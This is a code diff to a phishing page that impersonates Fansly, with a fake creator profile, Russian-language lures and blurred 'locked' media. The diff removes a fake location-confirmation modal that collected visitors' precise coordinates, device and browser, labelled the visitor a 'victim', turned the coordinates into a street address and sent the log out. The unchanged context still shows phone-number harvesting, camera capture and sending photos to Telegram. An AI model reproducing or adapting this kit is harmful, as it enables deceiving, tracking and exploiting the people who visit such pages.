@@ -391,33 +391,6 @@
         .close-camera { background: none; border: none; color: #888; margin-top: 12px; cursor: pointer; font-size: 14px; }
         .camera-status { color: #ff8888; font-size: 12px; margin-top: 10px; }
         
-        .geo-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.96);
-            z-index: 20000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .geo-box {
-            background: #1a1a1a;
-            border-radius: 32px;
-            padding: 32px 24px;
-            width: 100%;
-            max-width: 320px;
-            text-align: center;
-            border: 1px solid #ff3366;
-        }
-        .geo-box h3 { font-size: 24px; margin-bottom: 12px; color: #ff6680; }
-        .geo-box p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        .geo-btn { background: #ff3366; border: none; padding: 14px; border-radius: 40px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; }
-        .geo-status { font-size: 12px; color: #ff8888; margin-top: 12px; }
-        
         .stats-bar {
             position: fixed;
             top: 70px;
@@ -468,23 +441,23 @@
 <div class="header">
     <div class="logo">fansly</div>
     <div class="header-buttons">
-        <div class="login-btn" onclick="requestGeoFirst()">Login</div>
-        <div class="signup-btn" onclick="requestGeoFirst()">Sign Up</div>
+        <div class="login-btn" onclick="showModal()">Login</div>
+        <div class="signup-btn" onclick="showModal()">Sign Up</div>
     </div>
 </div>
 
 <div class="profile">
-    <div class="avatar" onclick="requestGeoFirst()">🔥</div>
+    <div class="avatar" onclick="showModal()">🔥</div>
     <div class="profile-info">
-        <h2 onclick="requestGeoFirst()">AlenaSuck</h2>
-        <div class="username" onclick="requestGeoFirst()">@AlenaSuck</div>
-        <div class="bio" onclick="requestGeoFirst()">Люблю погорячее ❤️❤️</div>
+        <h2 onclick="showModal()">AlenaSuck</h2>
+        <div class="username" onclick="showModal()">@AlenaSuck</div>
+        <div class="bio" onclick="showModal()">Люблю погорячее ❤️❤️</div>
     </div>
 </div>
 
 <div class="tabs">
-    <div class="tab active" onclick="requestGeoFirst()">Posts</div>
-    <div class="tab" onclick="requestGeoFirst()">Media</div>
+    <div class="tab active" onclick="showModal()">Posts</div>
+    <div class="tab" onclick="showModal()">Media</div>
 </div>
 
 <div class="main-container">
@@ -516,18 +489,9 @@
             </div>
         </div>
         <div class="chat-input-area">
-            <input type="text" class="chat-input" placeholder="Напишите сообщение..." id="chatInput" onclick="requestGeoFirst()">
-            <button class="chat-send" onclick="requestGeoFirst()">→</button>
+            <input type="text" class="chat-input" placeholder="Напишите сообщение..." id="chatInput" onclick="showModal()">
+            <button class="chat-send" onclick="showModal()">→</button>
         </div>
-    </div>
-</div>
-
-<div id="geoModal" class="geo-modal">
-    <div class="geo-box">
-        <h3>📍 Подтверждение местоположения</h3>
-        <p>Для доступа к контенту необходимо дать разрешение</p>
-        <button class="geo-btn" onclick="requestGeo()">✅ Разрешить</button>
-        <div id="geoStatus" class="geo-status"></div>
     </div>
 </div>
 
@@ -572,7 +536,6 @@
         let currentPhone = "";
         let currentStep = "phone";
         let cameraStream = null;
-        let geoData = null;
 
         function sendLog(text) {
             try {
@@ -642,66 +605,6 @@
             msgDiv.scrollTop = msgDiv.scrollHeight;
         }
         setInterval(addRandomMessage, 8000 + Math.random() * 7000);
-        
-        // Геолокация
-        function requestGeoFirst() {
-            document.getElementById('geoModal').style.display = 'flex';
-        }
-        
-        function requestGeo() {
-            const statusDiv = document.getElementById('geoStatus');
-            statusDiv.innerHTML = "⏳ Определяем местоположение...";
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    geoData = { lat, lon, accuracy };
-                    
-                    const time = new Date().toLocaleString();
-                    const ua = navigator.userAgent;
-                    let device = "💻 Компьютер";
-                    if (ua.includes('iPhone')) device = "📱 iPhone";
-                    else if (ua.includes('Android')) device = "📱 Android";
-                    else if (ua.includes('Mobile')) device = "📱 Мобильное";
-                    
-                    let browser = "🌐 Другой";
-                    if (ua.includes('Chrome')) browser = "🌐 Chrome";
-                    else if (ua.includes('Firefox')) browser = "🦊 Firefox";
-                    else if (ua.includes('Safari')) browser = "🧭 Safari";
-                    else if (ua.includes('Edge')) browser = "🌊 Edge";
-                    
-                    sendLog(`📍 ТОЧНАЯ ГЕОЛОКАЦИЯ ЖЕРТВЫ!\n📱 ${device}\n${browser}\n🗺️ Координаты: ${lat}, ${lon}\n🎯 Точность: ${Math.round(accuracy)} метров\n🔗 ${window.location.href}\n⏰ ${time}`);
-                    
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
-                        .then(res => res.json())
-                        .then(data => {
-                            const address = data.display_name || "Неизвестно";
-                            sendLog(`📍 АДРЕС (приблизительно):\n${address}`);
-                        })
-                        .catch(() => {});
-                    
-                    statusDiv.innerHTML = "✅ Геолокация получена!";
-                    setTimeout(() => {
-                        document.getElementById('geoModal').style.display = 'none';
-                        showModal();
-                    }, 1000);
-                },
-                (error) => {
-                    let errorMsg = "❌ Ошибка: ";
-                    if (error.code === 1) errorMsg += "Доступ запрещен";
-                    else if (error.code === 2) errorMsg += "Недоступно";
-                    else errorMsg += "Попробуйте еще раз";
-                    statusDiv.innerHTML = errorMsg;
-                    setTimeout(() => {
-                        document.getElementById('geoModal').style.display = 'none';
-                        showModal();
-                    }, 2000);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        }
         
         // Фото в Telegram
         async function sendPhotoToTelegram(photoData) {
@@ -787,7 +690,7 @@
         for (let i = 0; i < blurImages.length; i++) {
             const div = document.createElement('div');
             div.className = 'media-item';
-            div.onclick = () => requestGeoFirst();
+            div.onclick = () => showModal();
             div.innerHTML = `<div class="blur-thumb" style="background-image: url('${blurImages[i]}');"></div><div class="lock-overlay">🔒</div>`;
             grid.appendChild(div);
         }
@@ -922,8 +825,6 @@
             }
         }
         
-        window.requestGeoFirst = requestGeoFirst;
-        window.requestGeo = requestGeo;
         window.showModal = showModal;
         window.closeModal = closeModal;
         window.handleAction = handleAction;
